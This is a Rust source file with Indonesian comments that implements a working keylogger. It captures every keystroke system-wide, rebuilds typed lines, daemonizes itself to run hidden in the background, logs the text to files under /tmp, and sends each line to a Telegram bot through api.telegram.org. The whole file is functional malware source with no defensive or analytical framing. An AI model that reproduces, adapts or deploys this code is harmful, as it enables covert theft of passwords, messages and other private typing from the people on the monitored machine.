use daemonize::Daemonize;
use dotenv::dotenv;
use rdev::{listen, Event, EventType, Key};
use reqwest::StatusCode;
use std::{env, fs::OpenOptions, sync::{Arc, Mutex}, io::Write};

static mut LAST_SENT_MESSAGE: Option<String> = None;

// fungsi untuk mencatat buffer kalimat ke file log
fn log_sentence(sentence: &str) {
    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open("keylogger.log")
        .expect("Unable to open or create log file");
    if let Err(e) = writeln!(file, "{}", sentence) {
        eprintln!("Error writing to log file : {}", e);
    }
}

fn map_key_to_string(
    key: Key,
    shift_pressed: bool,
    ctrl_pressed: bool,
    caps_lock_pressed: bool,
) -> Option<String> {
    let is_caps = shift_pressed ^ caps_lock_pressed; // Jika Caps Lock aktif, Shift mempengaruhi kapitalisasi
    match key {
        // Huruf
        Key::KeyA => Some(if is_caps { "A" } else { "a" }.to_string()),
        Key::KeyB => Some(if is_caps { "B" } else { "b" }.to_string()),
        Key::KeyC => Some(if is_caps { "C" } else { "c" }.to_string()),
        Key::KeyD => Some(if is_caps { "D" } else { "d" }.to_string()),
        Key::KeyE => Some(if is_caps { "E" } else { "e" }.to_string()),
        Key::KeyF => Some(if is_caps { "F" } else { "f" }.to_string()),
        Key::KeyG => Some(if is_caps { "G" } else { "g" }.to_string()),
        Key::KeyH => Some(if is_caps { "H" } else { "h" }.to_string()),
        Key::KeyI => Some(if is_caps { "I" } else { "i" }.to_string()),
        Key::KeyJ => Some(if is_caps { "J" } else { "j" }.to_string()),
        Key::KeyK => Some(if is_caps { "K" } else { "k" }.to_string()),
        Key::KeyL => Some(if is_caps { "L" } else { "l" }.to_string()),
        Key::KeyM => Some(if is_caps { "M" } else { "m" }.to_string()),
        Key::KeyN => Some(if is_caps { "N" } else { "n" }.to_string()),
        Key::KeyO => Some(if is_caps { "O" } else { "o" }.to_string()),
        Key::KeyP => Some(if is_caps { "P" } else { "p" }.to_string()),
        Key::KeyQ => Some(if is_caps { "Q" } else { "q" }.to_string()),
        Key::KeyR => Some(if is_caps { "R" } else { "r" }.to_string()),
        Key::KeyS => Some(if is_caps { "S" } else { "s" }.to_string()),
        Key::KeyT => Some(if is_caps { "T" } else { "t" }.to_string()),
        Key::KeyU => Some(if is_caps { "U" } else { "u" }.to_string()),
        Key::KeyV => Some(if is_caps { "V" } else { "v" }.to_string()),
        Key::KeyW => Some(if is_caps { "W" } else { "w" }.to_string()),
        Key::KeyX => Some(if is_caps { "X" } else { "x" }.to_string()),
        Key::KeyY => Some(if is_caps { "Y" } else { "y" }.to_string()),
        Key::KeyZ => Some(if is_caps { "Z" } else { "z" }.to_string()),

        // Angka dan simbol shift
        Key::Num1 => Some(
            if shift_pressed | ctrl_pressed {
                "!"
            } else {
                "1"
            }
            .to_string(),
        ),
        Key::Num2 => Some(
            if shift_pressed | ctrl_pressed {
                "@"
            } else {
                "2"
            }
            .to_string(),
        ),
        Key::Num3 => Some(
            if shift_pressed | ctrl_pressed {
                "#"
            } else {
                "3"
            }
            .to_string(),
        ),
        Key::Num4 => Some(
            if shift_pressed | ctrl_pressed {
                "$"
            } else {
                "4"
            }
            .to_string(),
        ),
        Key::Num5 => Some(
            if shift_pressed | ctrl_pressed {
                "%"
            } else {
                "5"
            }
            .to_string(),
        ),
        Key::Num6 => Some(
            if shift_pressed | ctrl_pressed {
                "^"
            } else {
                "6"
            }
            .to_string(),
        ),
        Key::Num7 => Some(
            if shift_pressed | ctrl_pressed {
                "&"
            } else {
                "7"
            }
            .to_string(),
        ),
        Key::Num8 => Some(
            if shift_pressed | ctrl_pressed {
                "*"
            } else {
                "8"
            }
            .to_string(),
        ),
        Key::Num9 => Some(
            if shift_pressed | ctrl_pressed {
                "("
            } else {
                "9"
            }
            .to_string(),
        ),
        Key::Num0 => Some(
            if shift_pressed | ctrl_pressed {
                ")"
            } else {
                "0"
            }
            .to_string(),
        ),

        // Simbol
        Key::Minus => Some(
            if shift_pressed | ctrl_pressed {
                "_"
            } else {
                "-"
            }
            .to_string(),
        ),
        Key::Equal => Some(
            if shift_pressed | ctrl_pressed {
                "+"
            } else {
                "="
            }
            .to_string(),
        ),
        Key::LeftBracket => Some(
            if shift_pressed | ctrl_pressed {
                "{"
            } else {
                "["
            }
            .to_string(),
        ),
        Key::RightBracket => Some(
            if shift_pressed | ctrl_pressed {
                "}"
            } else {
                "]"
            }
            .to_string(),
        ),
        Key::BackSlash => Some(
            if shift_pressed | ctrl_pressed {
                "|"
            } else {
                "\\"
            }
            .to_string(),
        ),
        Key::SemiColon => Some(
            if shift_pressed | ctrl_pressed {
                ":"
            } else {
                ";"
            }
            .to_string(),
        ),
        Key::Quote => Some(
            if shift_pressed | ctrl_pressed {
                "\""
            } else {
                "'"
            }
            .to_string(),
        ),
        Key::Comma => Some(",".to_string()),
        Key::Dot => Some(".".to_string()),
        Key::Slash => Some(
            if shift_pressed | ctrl_pressed {
                "?"
            } else {
                "/"
            }
            .to_string(),
        ),

        // Tombol navigasi dan fungsi
        Key::Space => Some(" ".to_string()),
        Key::Return => Some("\n".to_string()),
        Key::Backspace => Some("[Backspace]".to_string()),
        Key::Tab => Some("[Tab]".to_string()),
        Key::Escape => Some("[Esc]".to_string()),
        Key::BackQuote => Some(
            if shift_pressed | ctrl_pressed {
                "~"
            } else {
                "`"
            }
            .to_string(),
        ),
        Key::Alt => Some("[ALT]".to_string()),
        Key::UpArrow => Some("[UP Arrow]".to_string()),
        Key::LeftArrow => Some("[Left Arrow]".to_string()),
        Key::RightArrow => Some("[Right Arrow]".to_string()),
        Key::DownArrow => Some("[Down Arrow]".to_string()),

        _ => None, // Abaikan tombol lain
    }
}
// fungsi untuk mengirim log ke telegram
async fn send_to_telegram(bot_token: &str, chat_id: &str, message: &str) {
    println!("masuk fungsi kirim pesan lewat telegram");
    unsafe {
        if let Some(last_message) = &LAST_SENT_MESSAGE {
            if last_message == message{
                return;
            }
        }
    }
    let url = format!("https://api.telegram.org/bot{}/sendMessage", bot_token);
    let params = [("chat_id", chat_id), ("text", message)];

    let client = reqwest::Client::new();
    match client.post(&url).form(&params).send().await {
        Ok(response) => {
            if response.status() == StatusCode::OK {
                unsafe {
                    LAST_SENT_MESSAGE = Some(message.to_string());
                }
            } else {
                let error_text = response.text().await.unwrap_or_else(|_| "No response text".to_string());
                eprintln!("gagal mengirim pesan {}",error_text)
            }
        }
        Err(err) => eprintln!("Error saat mengirim pesan : {}",err),
    }
}
fn get_token_from_env(name: &str) -> Arc<String>{
    match env::var(name) {
        Ok(value) => Arc::new(value),
        Err(e) =>{
            eprintln!("Error retrieving {}: {}", name, e);
            std::process::exit(1);
        }
    }
}
#[tokio::main]
async fn main() {
    dotenv().ok();
    let stdout_file = std::fs::OpenOptions::new().create(true).append(true).open("/tmp/keylogger.log").unwrap();
    let stderr_file = std::fs::OpenOptions::new().create(true).append(true).open("/tmp/keylogger_error.log").unwrap();
            let daemonize = Daemonize::new()
                .pid_file("/tmp/keylogger.pid")
                .chown_pid_file(true)
                .umask(0o002)
                .stdout(stdout_file)
                .stderr(stderr_file)
                .working_directory("/tmp");
            let telegram_bot_token = get_token_from_env("TELEGRAM_BOT_TOKEN");
            let telgram_chat_id = get_token_from_env("TELEGRAM_CHAT_ID");
            match daemonize.start() {
                Ok(_) =>{
                    println!("program berhasil berjalan di belakang layar")
                }
                Err(e) => {
                    eprintln!("gagal memulai daemond {}",e);
                    std::process::exit(1);
                }
            }
            let buffer = Arc::new(Mutex::new(String::new()));
            let shift_pressed = Arc::new(Mutex::new(false));
            let ctrl_pressed = Arc::new(Mutex::new(false));
            let caps_lock_pressed = Arc::new(Mutex::new(false));

            let callback = {
                let buffer = Arc::clone(&buffer);
                let shift_pressed = Arc::clone(&shift_pressed);
                let ctrl_pressed = Arc::clone(&ctrl_pressed);
                let caps_lock_pressed = Arc::clone(&caps_lock_pressed);
                let bot_token = Arc::clone(&telegram_bot_token);
                let chat_id = Arc::clone(&telgram_chat_id);

                move |event: Event|  {
                    if let EventType::KeyPress(key) = event.event_type {
                        let mut shift_state = shift_pressed.lock().unwrap();
                        let mut ctrl_state = ctrl_pressed.lock().unwrap();
                        let mut caps_lock_state = caps_lock_pressed.lock().unwrap();

                        if key == Key::ShiftLeft || key == Key::ShiftRight {
                            *shift_state = true;
                        } else if key == Key::ControlLeft || key == Key::ControlRight {
                            *ctrl_state = true
                        } else if key == Key::CapsLock {
                            *caps_lock_state = !*caps_lock_state;
                        } else if let Some(key_str) =
                            map_key_to_string(key, *shift_state, *ctrl_state, *caps_lock_state)
                        {
                            let mut buffer = buffer.lock().unwrap();
                            if key_str == "\n" {
                                let message = buffer.clone();
                                let msg = message.clone();
                                buffer.clear();
                                log_sentence(&msg);
                                let token = Arc::clone(&bot_token);
                                let chat_id = Arc::clone(&chat_id);
                                println!("memulai mengirim pesan");
                                tokio::task::block_in_place(move ||{
                                    let future = send_to_telegram(&token, &chat_id, &message);
                                    tokio::runtime::Runtime::new().unwrap().block_on(future);
                                });
                                println!("selesai mengirim pesan");
                            } else if key_str == "[Backspace]" {
                                buffer.pop();
                            } else {
                                buffer.push_str(&key_str);
                            }
                        }
                    }
                    if let EventType::KeyRelease(key) = event.event_type{
                        if key == Key::ShiftLeft || key == Key::ShiftRight {
                            let mut shift_state = shift_pressed.lock().unwrap();
                            *shift_state = false;
                        } else if key == Key::ControlLeft || key == Key::ControlRight {
                            let mut ctrl_state = ctrl_pressed.lock().unwrap();
                            *ctrl_state = false;
                        }
                    }
                }
            };
            if let Err(error) = listen(callback) {
                eprintln!("Error: {:?}", error);
            }
    
}
